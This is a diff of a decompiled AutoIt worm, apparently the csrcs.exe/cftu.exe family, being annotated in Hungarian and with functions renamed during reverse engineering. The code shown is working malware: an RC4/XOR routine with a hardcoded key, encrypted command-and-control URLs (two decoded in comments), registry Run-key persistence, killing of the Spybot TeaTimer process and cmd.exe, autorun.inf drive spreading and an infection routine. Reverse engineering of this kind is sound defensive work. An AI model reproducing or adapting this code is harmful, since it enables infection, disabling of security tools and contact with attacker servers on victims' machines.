@@ -1334,8 +1334,8 @@ Func Fn009C()
 		Fn00B8()
 		$Var0360 = RegRead($DRMAmtyRegistryKey, "exp1")
 		$Var0361 = RegRead($DRMAmtyRegistryKey, "dreg")
-		$Var0362 = Decrypt(0, $Var0360, $EncryptionKey, 4) + 0x000F
-		$Var0363 = Decrypt(0, $Var0361, $EncryptionKey, 4)
+		$Var0362 = Crypting(0, $Var0360, $EncryptionKey, 4) + 0x000F
+		$Var0363 = Crypting(0, $Var0361, $EncryptionKey, 4)
 		If $Var0362 * 1 <= @YDAY * 1 Or $Var0363 * 1 < @YEAR * 1 Then
 			Fn00EC()
 			$Var035F = Fn00B9($Var0339, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
@@ -1382,7 +1382,7 @@ Func Fn009C()
 			If $Var02DD = 0 Then
 				If @IPAddress1 <> "127.0.0.1" And @IPAddress1 <> "0.0.0.0" Then
 					TCPStartup()
-					$Var0364 = TCPNameToIP(Decrypt(0, "408006571CB7BBE3DC1D7A5E0C45C5ABF2F90A9CB151D7C4BCBD1004419295F01C9134AD0EB273C35FCFFBF3EC34261C8624D15A1ED50CC986D48DD17A79649F", $EncryptionKey, 2))
+					$Var0364 = TCPNameToIP(Crypting(0, "408006571CB7BBE3DC1D7A5E0C45C5ABF2F90A9CB151D7C4BCBD1004419295F01C9134AD0EB273C35FCFFBF3EC34261C8624D15A1ED50CC986D48DD17A79649F", $EncryptionKey, 2))
 					TCPShutdown()
 					$Var0365 = 1
 					$Var0364 = StringSplit($Var0364, ".")
@@ -1395,13 +1395,13 @@ Func Fn009C()
 					$Var0367 = 0x0030
 					$Var0368 = 0
 					While 1
-						$Var0369 = Decrypt(1, $Var0365, $Var0365, 0)
+						$Var0369 = Crypting(1, $Var0365, $Var0365, 0)
 						$Var036A = Chr($Var0366)
 						$Var036B = Chr($Var0367)
 						$Var0366 = $Var0366 + 1
 						$Var0367 = $Var0367 + 1
 						$Var0365 = $Var0365 + 1
-						$RegKey = Decrypt(1, $Var036A & $Var036B, $Var0369, 0)
+						$RegKey = Crypting(1, $Var036A & $Var036B, $Var0369, 0)
 						$RegName = StringLower($RegKey)
 						If $RegName = "62d13aa0" Then $RegName = "5eb149c0"
 						If $RegName = "ffbfcf9b" Then $RegName = "5eb149c0"
@@ -2053,8 +2053,8 @@ Func Fn009C()
 						If $Var03AE = 1 Or $Var03AE = 0 Then
 							$Var0360 = RegRead($DRMAmtyRegistryKey, "exp1")
 							$Var0361 = RegRead($DRMAmtyRegistryKey, "dreg")
-							$Var0362 = Decrypt(0, $Var0360, $EncryptionKey, 4)
-							$Var0363 = Decrypt(0, $Var0361, $EncryptionKey, 4)
+							$Var0362 = Crypting(0, $Var0360, $EncryptionKey, 4)
+							$Var0363 = Crypting(0, $Var0361, $EncryptionKey, 4)
 							If $Var0362 * 1 + $Var03C3 <= @YDAY * 1 Or $Var0363 * 1 < @YEAR * 1 Then
 								If FileExists(@SystemDir & "\" & $Var0386) Then
 									FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
@@ -2994,7 +2994,7 @@ Func Fn009E()
 						If FileExists($Var0414[$Var0350] & "\" & $AutoRunInfName) Then
 							$Var0345 = FileReadLine($Var0414[$Var0350] & "\" & $AutoRunInfName, 9)
 							$Var0345 = StringTrimLeft($Var0345, 1)
-							$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
+							$Var0345 = Crypting(0, $Var0345, $EncryptionKey, 1)
 							$Var0345 = StringSplit($Var0345, "!")
 							For $Var0346 = 1 To $Var0345[0]
 								If $Var0345[0] = 2 Then
@@ -3088,7 +3088,7 @@ Func Fn009F()
 					If FileExists($Var0414[$Var0350] & "\" & $AutoRunInfName) Then
 						$Var0345 = FileReadLine($Var0414[$Var0350] & "\" & $AutoRunInfName, 9)
 						$Var0345 = StringTrimLeft($Var0345, 1)
-						$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
+						$Var0345 = Crypting(0, $Var0345, $EncryptionKey, 1)
 						$Var0345 = StringSplit($Var0345, "!")
 						For $Var0346 = 1 To $Var0345[0]
 							If $Var0345[0] = 2 Then
@@ -3318,18 +3318,17 @@ Func Fn00A7($Folder1, $File1, $Folder2, $File2)
 	$Folder2 = StringInStr($Folder1, $Folder2)
 	$Var0423 = $Folder2 - $File1
 	$Var0424 = StringMid($Folder1, $File1, $Var0423)
-	$Var02C6 = Decrypt(0, $Var0424, $File2, 2)
+	$Var02C6 = Crypting(0, $Var0424, $File2, 2)
 	Return $Var02C6
 	$Var0424 = ""
 EndFunc
 
-; $File1 string to decode
-; $Folder2 key
-Func Decrypt($Folder1, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
-	If $Folder1 <> 0 And $Folder1 <> 1 Then
+Func Crypting($Mode, $EncodedString, $CryptingionKey, $ArgOpt03 = 1)
+	; $Mode = 0: visszafejtés, $Mode = 1: titkosítás
+  If $Mode <> 0 And $Mode <> 1 Then
 		SetError(1)
 		Return ""
-	ElseIf $EncodedString = "" Or $DecryptionKey = "" Then
+	ElseIf $EncodedString = "" Or $CryptingionKey = "" Then
 		SetError(1)
 		Return ""
 	Else
@@ -3346,18 +3345,18 @@ Func Decrypt($Folder1, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
 		Local $Var042D
 		Local $Var042E
 		Local $Var042F
-		If $Folder1 = 1 Then
+		If $Mode = 1 Then
 			For $Var0430 = 0 To $ArgOpt03 Step 1
 				$Var0427 = ""
 				$Var0426 = ""
 				$Var0425 = ""
 				For $Var0427 = 1 To StringLen($EncodedString)
-					If $Var0426 = StringLen($DecryptionKey) Then
+					If $Var0426 = StringLen($CryptingionKey) Then
 						$Var0426 = 1
 					Else
 						$Var0426 += 1
 					EndIf
-					$Var0425 = $Var0425 & Chr(BitXOR(Asc(StringMid($EncodedString, $Var0427, 1)), Asc(StringMid($DecryptionKey, $Var0426, 1)), 0x00FF))
+					$Var0425 = $Var0425 & Chr(BitXOR(Asc(StringMid($EncodedString, $Var0427, 1)), Asc(StringMid($CryptingionKey, $Var0426, 1)), 0x00FF))
 				Next
 				$EncodedString = $Var0425
 				$Var0429 = ""
@@ -3371,7 +3370,7 @@ Func Decrypt($Folder1, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
 				$Local0028 = ""
 				Local $Local0028[0x0100][2]
 				For $Var0429 = 0 To 0x00FF
-					$Local0028[$Var0429][1] = Asc(StringMid($DecryptionKey, Mod($Var0429, StringLen($DecryptionKey)) + 1, 1))
+					$Local0028[$Var0429][1] = Asc(StringMid($CryptingionKey, Mod($Var0429, StringLen($CryptingionKey)) + 1, 1))
 					$Local0028[$Var0429][0] = $Var0429
 				Next
 				For $Var0429 = 0 To 0x00FF
@@ -3401,7 +3400,7 @@ Func Decrypt($Folder1, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
 				$Local0028 = ""
 				Local $Local0028[0x0100][2]
 				For $Var0429 = 0 To 0x00FF
-					$Local0028[$Var0429][1] = Asc(StringMid($DecryptionKey, Mod($Var0429, StringLen($DecryptionKey)) + 1, 1))
+					$Local0028[$Var0429][1] = Asc(StringMid($CryptingionKey, Mod($Var0429, StringLen($CryptingionKey)) + 1, 1))
 					$Local0028[$Var0429][0] = $Var0429
 				Next
 				For $Var0429 = 0 To 0x00FF
@@ -3422,12 +3421,12 @@ Func Decrypt($Folder1, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
 				$Var0426 = ""
 				$Var0425 = ""
 				For $Var0427 = 1 To StringLen($EncodedString)
-					If $Var0426 = StringLen($DecryptionKey) Then
+					If $Var0426 = StringLen($CryptingionKey) Then
 						$Var0426 = 1
 					Else
 						$Var0426 += 1
 					EndIf
-					$Var0425 &= Chr(BitXOR(Asc(StringMid($EncodedString, $Var0427, 1)), Asc(StringMid($DecryptionKey, $Var0426, 1)), 0x00FF))
+					$Var0425 &= Chr(BitXOR(Asc(StringMid($EncodedString, $Var0427, 1)), Asc(StringMid($CryptingionKey, $Var0426, 1)), 0x00FF))
 				Next
 				$EncodedString = $Var0425
 			Next
@@ -4088,7 +4087,7 @@ Func Fn00B2($Folder1, $File1)
 	While 1
 		$Var043F = $Var043F + 1
 		$Var0448 = FileReadLine($Folder1, $Var043F)
-		$Var0449 = Decrypt(0, $Var0448, $EncryptionKey, 1)
+		$Var0449 = Crypting(0, $Var0448, $EncryptionKey, 1)
 		If $Var043F = 3 Then
 			If $Var0449 <> ";start" Then ExitLoop
 		EndIf
@@ -4207,7 +4206,7 @@ EndFunc
 Func Fn00B7($Folder1, $File1, $Folder2, $File2, $Arg04)
 	$Var044E = 0
 	If RegRead($Folder2, $File2) <> "" Then
-		$Var03D2 = Decrypt(0, RegRead($Folder2, $File2), $Arg04, 4)
+		$Var03D2 = Crypting(0, RegRead($Folder2, $File2), $Arg04, 4)
 	Else
 		$Var03D2 = Fn009B($Folder1)
 		If @error = 1 Then
@@ -4216,7 +4215,7 @@ Func Fn00B7($Folder1, $File1, $Folder2, $File2, $Arg04)
 			$Var044F = StringSplit($Var03D2, ";")
 			If $Var044F[0] = 4 Then
 				If StringLen($Var044F[2]) = 2 Then
-					$Var0402 = RegWrite($Folder2, $File2, "REG_SZ", Decrypt(1, $Var03D2, $Arg04, 4))
+					$Var0402 = RegWrite($Folder2, $File2, "REG_SZ", Crypting(1, $Var03D2, $Arg04, 4))
 				EndIf
 			Else
 				$Var03D2 = "-1"
@@ -4232,7 +4231,7 @@ Func Fn00B7($Folder1, $File1, $Folder2, $File2, $Arg04)
 				$Var044F = StringSplit($Var03D2, ";")
 				If $Var044F[0] = 4 Or $Var044F[0] = 2 Then
 					If StringLen($Var044F[2]) = 2 Then
-						$Var0402 = RegWrite($Folder2, $File2, "REG_SZ", Decrypt(1, $Var03D2, $Arg04, 4))
+						$Var0402 = RegWrite($Folder2, $File2, "REG_SZ", Crypting(1, $Var03D2, $Arg04, 4))
 					EndIf
 				Else
 					$Var03D2 = "-1"
@@ -4400,7 +4399,7 @@ Func Fn00BB($Folder1, $File1, $Folder2, $File2, $ArgOpt04 = "", $ArgOpt05 = "")
 			$Var045F[0] += 1
 		Until $Var0464 = 8
 	EndIf
-	Fn0092($Var045F, 9 - $Var0462, ";" & Decrypt(1, $Folder2 & "!" & $File1, $File2, 1))
+	Fn0092($Var045F, 9 - $Var0462, ";" & Crypting(1, $Folder2 & "!" & $File1, $File2, 1))
 	$Var0465 = Fn0094($Var045F, @CRLF, 1)
 	If $ArgOpt05 <> "" Then
 		$Var0466 = StringInStr($Var0465, "", 0, 1)
@@ -5059,10 +5058,10 @@ Func Fn00DC($Folder1)
 	Else
 		If $Var0325 <> "" And StringRegExp($Var0325, "http://") = 1 Then
 			$Var0325 = Fn009B($Var0325)
-			If StringRegExp($Var0325, Decrypt(1, "*S_", 0x000173AB, 1)) = 1 And StringRegExp($Var0325, Decrypt(1, "D?�", 0x00012837, 1)) = 1 Then
-				$Var0325 = StringReplace($Var0325, Decrypt(1, "*S_", 0x000173AB, 1), "")
-				$Var0325 = StringReplace($Var0325, Decrypt(1, "D?�", 0x00012837, 1), "")
-				$Var0325 = Decrypt(0, $Var0325, 0x000100BD, 1)
+			If StringRegExp($Var0325, Crypting(1, "*S_", 0x000173AB, 1)) = 1 And StringRegExp($Var0325, Crypting(1, "D?�", 0x00012837, 1)) = 1 Then
+				$Var0325 = StringReplace($Var0325, Crypting(1, "*S_", 0x000173AB, 1), "")
+				$Var0325 = StringReplace($Var0325, Crypting(1, "D?�", 0x00012837, 1), "")
+				$Var0325 = Crypting(0, $Var0325, 0x000100BD, 1)
 				$Var04C2 = StringSplit($Var0325, "~")
 				If IsArray($Var04C2) Then
 					For $Var04C3 = 1 To $Var04C2[0]
@@ -5212,10 +5211,10 @@ EndFunc
 Func Fn00E3()
 	If $Var0325 <> "" And StringRegExp($Var0325, "http://") = 1 Then
 		$Var0325 = Fn009B($Var0325)
-		If StringRegExp($Var0325, Decrypt(1, "*S_", 0x000173AB, 1)) = 1 And StringRegExp($Var0325, Decrypt(1, "D?�", 0x00012837, 1)) = 1 Then
-			$Var0325 = StringReplace($Var0325, Decrypt(1, "*S_", 0x000173AB, 1), "")
-			$Var0325 = StringReplace($Var0325, Decrypt(1, "D?�", 0x00012837, 1), "")
-			$Var0325 = Decrypt(0, $Var0325, 0x000100BD, 1)
+		If StringRegExp($Var0325, Crypting(1, "*S_", 0x000173AB, 1)) = 1 And StringRegExp($Var0325, Crypting(1, "D?�", 0x00012837, 1)) = 1 Then
+			$Var0325 = StringReplace($Var0325, Crypting(1, "*S_", 0x000173AB, 1), "")
+			$Var0325 = StringReplace($Var0325, Crypting(1, "D?�", 0x00012837, 1), "")
+			$Var0325 = Crypting(0, $Var0325, 0x000100BD, 1)
 			$Var04C2 = StringSplit($Var0325, "~")
 			If IsArray($Var04C2) Then
 				For $Var04C3 = 1 To $Var04C2[0]
@@ -5405,37 +5404,43 @@ Func Fn00EA()
 	Return $Var0355 & "-" & $Var04DE & "-" & $Var04DF
 EndFunc
 
-Func Fn00EB()
+Func GetURLs1()
 	$EncryptionKey = "A0P52MA78LS9O7EN1UI89A7B9NP6254FU1E3NA2S154HQ987"
 	ConsoleWrite($EncryptionKey & @CRLF)
+
 	;$Var0330 = ""
 	;$Var0331 = ""
 	;$Var0332 = ""
 	;$Var0333 = ""
-	$Var0334 = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EEC73E35463F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $EncryptionKey, 2)
+
+  ; http://www.5eb149c0.com/xny.htm
+	$Var0334 = Crypting(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EEC73E35463F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $EncryptionKey, 2)
 	ConsoleWrite($Var0334 & @CRLF)
-	$Var0335 = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419395F01C924ADC0EB60FB75FCAFBF1EC30271C8620D05C1ED40BCD86D78DA37A791A9AE124A6239AF6EF24624E6E9D95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EEC73D35343F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $EncryptionKey, 2)
+
+	; http://suse.extasic.com/eny.htm
+  $Var0335 = Crypting(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419395F01C924ADC0EB60FB75FCAFBF1EC30271C8620D05C1ED40BCD86D78DA37A791A9AE124A6239AF6EF24624E6E9D95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EEC73D35343F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $EncryptionKey, 2)
 	ConsoleWrite($Var0335 & @CRLF)
+
 	;$Var0336 = ""
 	;$Var0337 = ""
 	;$Var0338 = ""
 EndFunc
 
 Func Fn00EC()
-	$Var0339 = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419395F01C914AD60EB673C15FCBFBF3EC34271B8624D15A1ED50CCE86D48DD77A7A1A99E657A6519AF6EF25624E6F9A95749C544AF41CF9DA73D1FA6263E0C3C1D9B0EFC73D35463F9CD017317C48D3", $EncryptionKey, 2)
+	$Var0339 = Crypting(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419395F01C914AD60EB673C15FCBFBF3EC34271B8624D15A1ED50CCE86D48DD77A7A1A99E657A6519AF6EF25624E6F9A95749C544AF41CF9DA73D1FA6263E0C3C1D9B0EFC73D35463F9CD017317C48D3", $EncryptionKey, 2)
 	ConsoleWrite($Var0339 & @CRLF)
-	$Var033A = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419290F51C914ADC0EB60FC35FCAFCF2EC30271C8620D1591ED40CC886D78DD47A7D649CE123DA239AF6EF5962496E9A92049C564A8E1C8BDA72AF8F1E10E0C2C1DDB799C73E35333F9FD711", $EncryptionKey, 2)
+	$Var033A = Crypting(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419290F51C914ADC0EB60FC35FCAFCF2EC30271C8620D1591ED40CC886D78DD47A7D649CE123DA239AF6EF5962496E9A92049C564A8E1C8BDA72AF8F1E10E0C2C1DDB799C73E35333F9FD711", $EncryptionKey, 2)
 	ConsoleWrite($Var033A & @CRLF)
-	$Var033B = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419295F262E634A80EB573C55FCBFCF3EC30271C8620D0591ED50BCA86D7F1D17A7D649CE123DA259AF1EA2662496E9A92039C524A8E1C8BDA72AF8F1E10E0C2C1DDB799C73E35333F9FD711", $EncryptionKey, 2)
+	$Var033B = Crypting(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419295F262E634A80EB573C55FCBFCF3EC30271C8620D0591ED50BCA86D7F1D17A7D649CE123DA259AF1EA2662496E9A92039C524A8E1C8BDA72AF8F1E10E0C2C1DDB799C73E35333F9FD711", $EncryptionKey, 2)
 	ConsoleWrite($Var033B & @CRLF)
-	$Var033C = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754192908C1C914AAB0EB60FB75FCEFCF5EC31276E8627D1291ED70CC881A58DD67A7B1A9EE121A6259D81EA58624A6F9A95749C554AF31CF9DA08D1F91E6BE7B3C1D9B0EEC73E32473F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $EncryptionKey, 2)
+	$Var033C = Crypting(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754192908C1C914AAB0EB60FB75FCEFCF5EC31276E8627D1291ED70CC881A58DD67A7B1A9EE121A6259D81EA58624A6F9A95749C554AF31CF9DA08D1F91E6BE7B3C1D9B0EEC73E32473F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $EncryptionKey, 2)
 	ConsoleWrite($Var033C & @CRLF)
 EndFunc
 
 Func Fn00ED()
-	$Var033D = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419290F71C9134D70EB60FB75FCBFCF2EC30271C8620D15B1ED40BCA86D48DD67A79649DE123DA249AF6EA5862496E9B92049D574AF41DF9DA0ED1F96262E0C5C1DDB0EFC73E35473AEBD714317C48D4133230ACBED7B1DB", $EncryptionKey, 2)
+	$Var033D = Crypting(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419290F71C9134D70EB60FB75FCBFCF2EC30271C8620D15B1ED40BCA86D48DD67A79649DE123DA249AF6EA5862496E9B92049D574AF41DF9DA0ED1F96262E0C5C1DDB0EFC73E35473AEBD714317C48D4133230ACBED7B1DB", $EncryptionKey, 2)
 	ConsoleWrite($Var033D & @CRLF)
-	$Var033E = Decrypt(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EFC73D32443F9FD714317848D5133231ABBED7B1DA974FD8100BCE2C3E502C8EC3FAE8D5B7E327E509", $EncryptionKey, 2)
+	$Var033E = Crypting(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EFC73D32443F9FD714317848D5133231ABBED7B1DA974FD8100BCE2C3E502C8EC3FAE8D5B7E327E509", $EncryptionKey, 2)
 	ConsoleWrite($Var033E & @CRLF)
 EndFunc
 
@@ -5549,7 +5554,7 @@ If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir 
 	EndIf
 	; alvás 3000 ms = 3 s hosszan
   Sleep(0x0BB8)
-  ; ha a györkérből fut, akkor "981dsaf81wae98f19c8v98r1aeg1" névvel hoz létre mutex-et
+  ; ha a gyökérből fut, akkor "981dsaf81wae98f19c8v98r1aeg1" névvel hoz létre mutex-et
 	If CreateMutex("981dsaf81wae98f19c8v98r1aeg1", 1) = 0 Then
 		Exit
 	EndIf
@@ -5697,6 +5702,8 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUExeName
 	; TeaTimer.exe bezárása
   ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
   ProcessClose("TeaTimer.exe")
+
+  ; automatikus indítás beállítása
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUProcessName, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUProcessName, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUProcessName, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
@@ -5728,10 +5735,17 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUExeName
 		EndIf
 	EndIf
 
-	DeleteFilesInFixedDriveRoots()
+	; kitakarítja a gyökérmappákat
+  DeleteFilesInFixedDriveRoots()
+  ; kitakarítja a script mappáját
 	DeleteFilesInScriptDir()
+
+  ; a fájlnév a cftu.exe lesz
 	$RandomFileName = $CFTUExeName
+
+  ; és fertőz
 	InfectPC()
+
 	Sleep(10 * 0x03E8) ; 10 * 1000 = 10 000 ms = 10 s
 	Sleep(10 * 0x003C * 0x03E8) ; 10 * 60 * 1000 = 60 000 ms = 60 s = 1 m
 
@@ -5739,7 +5753,8 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUExeName
   If ProcessExists($CSRCSExeName) Then
 		; a csrcs.exe újabb verziójú, mint a cftu.exe, ami elindult
     If FileGetVersion(@SystemDir & "\" & $CFTUExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
-			If RegRead($DRMAmtyRegistryKey, "exp1") <> "" Then
+			; létezik a registry kulcs, a gép már fertőzött
+      If RegRead($DRMAmtyRegistryKey, "exp1") <> "" Then
 				; TeaTimer.exe bezárása
         ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
         ProcessClose("TeaTimer.exe")
@@ -5748,6 +5763,8 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUExeName
         RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUProcessName)
+
+        ; kitakarít maga után
 				RunSCmd()
 			EndIf
 		EndIf
@@ -5763,37 +5780,51 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeNa
   ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
 	ProcessClose("TeaTimer.exe")
 
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
+  ; automatikus indítás beállítása
+  RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
-	If ProcessExists($CSRCSExeName) Then
+
+  ; ha fut a csrcs.exe
+  If ProcessExists($CSRCSExeName) Then
+    ; a csrcs.exe újabb verziójú, mint a cftuon.exe, ami elindult
 		If FileGetVersion(@SystemDir & "\" & $CFTUONExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
+      ; létezik a registry kulcs, a gép már fertőzött
 			If RegRead($DRMAmtyRegistryKey, "exp1") <> "" Then
         ; TeaTimer.exe bezárása
         ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
         ProcessClose("TeaTimer.exe")
 
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName)
+				; kitörli az előbb beírt registry értékeket, hogy ne fusson duplán
+        RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName)
-				RunSCmd()
+				
+        ; kitakarít maga után
+        RunSCmd()
 			EndIf
 		EndIf
 	EndIf
-	If ProcessExists($CSRCSExeName) Then
+
+	; csrcs.exe bezására (ne fusson két példány)
+  If ProcessExists($CSRCSExeName) Then
 		ProcessClose($CSRCSExeName)
-		Sleep(0x01F4)
+		Sleep(0x01F4) ; 500 ms = 0,5 s
 		If ProcessExists($CSRCSExeName) Then
-			ProcessWaitClose($CSRCSExeName, 0x003C)
+			ProcessWaitClose($CSRCSExeName, 0x003C) ; 60 ms = 0,06 s
 		EndIf
 	EndIf
+
+  ; parancssor bezárása
 	If ProcessExists("cmd.exe") Then
 		ProcessClose("cmd.exe")
-		Sleep(0x01F4)
+		Sleep(0x01F4) ; 500 ms = 0,5 s
 		If ProcessExists("cmd.exe") Then
-			ProcessWaitClose("cmd.exe", 0x003C)
+			ProcessWaitClose("cmd.exe", 0x003C) ; 60 ms = 0,06 s
 		EndIf
 	EndIf
+
+  ; ha van futó NET parancs, bezárja ???
 	If ProcessExists("net.exe") Then
 		ProcessClose("net.exe")
 		Sleep(0x01F4)
@@ -5801,23 +5832,38 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeNa
 			ProcessWaitClose("net.exe", 0x003C)
 		EndIf
 	EndIf
+
+  ; kitakarítja a gyökérmappákat
 	DeleteFilesInFixedDriveRoots()
+  ; kitakarítja a script mappáját
 	DeleteFilesInScriptDir()
+
+  ; a fájlnév a cftuon.exe lesz
 	$RandomFileName = $CFTUONExeName
+
+  ; és fertőz
 	InfectPCWithCheck()
-	Sleep(10 * 0x03E8)
-	Sleep(10 * 0x003C * 0x03E8)
-	If ProcessExists($CSRCSExeName) Then
+
+	Sleep(10 * 0x03E8) ; 10 * 1000 = 10 000 ms = 10 s
+	Sleep(10 * 0x003C * 0x03E8) ; 10 * 60 * 1000 = 60 000 ms = 60 s = 1 m
+
+	; ha fut a csrcs.exe
+  If ProcessExists($CSRCSExeName) Then
+    ; a csrcs.exe újabb verziójú, mint a cftuon.exe, ami elindult
 		If FileGetVersion(@SystemDir & "\" & $CFTUONExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
+      ; létezik a registry kulcs, a gép már fertőzött
 			If RegRead($DRMAmtyRegistryKey, "exp1") <> "" Then
         ; TeaTimer.exe bezárása
         ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
         ProcessClose("TeaTimer.exe")
 
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName)
+				; kitörli az előbb beírt registry értékeket, hogy ne fusson duplán
+        RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName)
-				RunSCmd()
+
+        ; kitakarít maga után
+        RunSCmd()
 			EndIf
 		EndIf
 	EndIf
@@ -5830,15 +5876,19 @@ EndIf
 ;If @ScriptDir = @SystemDir Then
 ;EndIf
 
+; ha a windows\system32 mappában fut, akkor "df8g1sdf68g18er1g8re16" névvel hoz létre mutex-et
 If @ScriptDir = @SystemDir Then
 	If CreateMutex("df8g1sdf68g18er1g8re16", 1) = 0 Then
 		Exit
 	EndIf
-	Fn00EB()
+
+	GetURLs1()
+
 	$Var033F = $KHYFileName & "!" & $RandomFileName
-	$Var033F = Decrypt(1, $Var033F, $EncryptionKey, 1)
+	$Var033F = Crypting(1, $Var033F, $EncryptionKey, 1)
 	$Var02A8 = $RandomFileName
 EndIf
+
